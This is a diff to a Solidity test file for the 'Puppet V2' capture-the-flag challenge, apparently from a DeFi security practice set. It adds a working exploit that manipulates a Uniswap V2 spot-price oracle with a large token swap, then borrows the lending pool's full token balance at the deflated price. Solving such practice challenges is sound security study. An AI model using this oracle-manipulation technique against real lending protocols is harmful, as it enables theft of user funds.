@@ -83,22 +83,49 @@ contract PuppetV2Challenge is Test {
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
-    function test_assertInitialState() public view {
+    function test_assertInitialStatePuppetV2() public view {
         assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
         assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
         assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
         assertGt(uniswapV2Exchange.balanceOf(deployer), 0);
 
+        // console.log("deployer balance Uniswap LP Token:",uniswapV2Exchange.balanceOf(deployer));
+
         // Check pool's been correctly setup
         assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
         assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
+
+        uint256 amountInWETH=9.9001e18;
+        uint256 amountInToken=uniswapV2Router.getAmountIn(amountInWETH,UNISWAP_INITIAL_TOKEN_RESERVE,UNISWAP_INITIAL_WETH_RESERVE);
+        require(amountInToken<PLAYER_INITIAL_TOKEN_BALANCE,"not sufficient funds");
+
+        uint256 reserveA=UNISWAP_INITIAL_TOKEN_RESERVE+amountInToken;
+        uint256 reserveB=UNISWAP_INITIAL_WETH_RESERVE-amountInWETH;
+
+        uint256 priceOfTokenInWETH=uniswapV2Router.quote(POOL_INITIAL_TOKEN_BALANCE,reserveA,reserveB)*3;
+        console.log("borrow cost",priceOfTokenInWETH);
+
+        require(PLAYER_INITIAL_ETH_BALANCE+amountInWETH>priceOfTokenInWETH,"no enough eth to attack");
+        if(PLAYER_INITIAL_ETH_BALANCE+amountInWETH>priceOfTokenInWETH){
+            console.log("Attack amount:",amountInWETH);
+        }
     }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        address[] memory path=new address[](2);
+        path[0]=address(token);
+        path[1]=address(weth);
+
+        token.approve(address(uniswapV2Router),token.balanceOf(player));
+        uniswapV2Router.swapTokensForExactETH(9.9001e18,PLAYER_INITIAL_TOKEN_BALANCE,path,player,block.timestamp*2);
+        weth.deposit{value:player.balance}();
+        weth.approve(address(lendingPool),weth.balanceOf(player));
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        token.transfer(recovery,POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
